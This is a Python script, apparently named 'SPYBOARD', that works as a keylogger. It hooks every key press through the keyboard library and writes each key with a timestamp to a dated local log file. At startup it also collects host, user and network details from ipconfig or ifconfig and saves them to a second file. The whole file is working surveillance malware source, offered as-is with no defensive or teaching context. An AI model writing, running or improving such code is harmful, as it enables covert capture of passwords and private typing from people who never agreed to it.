import keyboard as k
from datetime import datetime
import os
import platform
from random import randint

# ____  ______   ______   ___    _    ____  ____  
#/ ___||  _ \ \ / / __ ) / _ \  / \  |  _ \|  _ \ 
#\___ \| |_) \ V /|  _ \| | | |/ _ \ | |_) | | | |
# ___) |  __/ | | | |_) | |_| / ___ \|  _ <| |_| |
#|____/|_|    |_| |____/ \___/_/   \_\_| \_\____/ 
#

def create_filename(base_name):
    filename = f"{base_name}_{datetime.now().strftime('%Y-%m-%d')}.txt"
    if os.path.exists(filename):
        filename = f"{base_name}_{datetime.now().strftime('%Y-%m-%d')}_{randint(0, 100)}.txt"
    return filename


keylog_filename = create_filename("keylog")
ip_filename = create_filename("ip")


IGNORE_KEYS = [
    'enter', 'space', 'ctrl', 'caps lock', 'esc', 'tab', 'alt', 'alt gr',
    'right shift', 'delete', 'backspace', 'left windows', 'None'
]


def capture_system_info():
    system_info = f"System: {platform.system()} {platform.release()}\n"
    system_info += f"Node: {platform.node()}\n"
    system_info += f"User: {os.getlogin()}\n"
    return system_info


def capture_ip_info():
    if platform.system() == "Windows":
        retorno = os.popen('ipconfig /all').read()
    else:
        retorno = os.popen('ifconfig').read()  
    with open(ip_filename, 'w') as f:
        f.write(capture_system_info())
        f.write(retorno)


def on_key_press(event):
    try:
        with open(keylog_filename, 'a') as f:
            letra = event.name
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            if letra in IGNORE_KEYS:
                if letra == 'space':
                    f.write(f"{timestamp} - [SPACE]\n")
                elif letra == 'enter':
                    f.write(f"{timestamp} - [ENTER]\n")
                else:
                    f.write(f"{timestamp} - [{letra.upper()} IGNORED]\n")
            else:
                f.write(f"{timestamp} - {letra}\n")
    except Exception as e:
        with open("error_log.txt", 'a') as error_file:
            error_file.write(f"{datetime.now()} - Error: {str(e)}\n")

# Main
if __name__ == "__main__":
    print("Keylogger is running. Press CTRL+C to exit.")
    capture_ip_info()  
    k.on_press(on_key_press)  
    k.wait()  
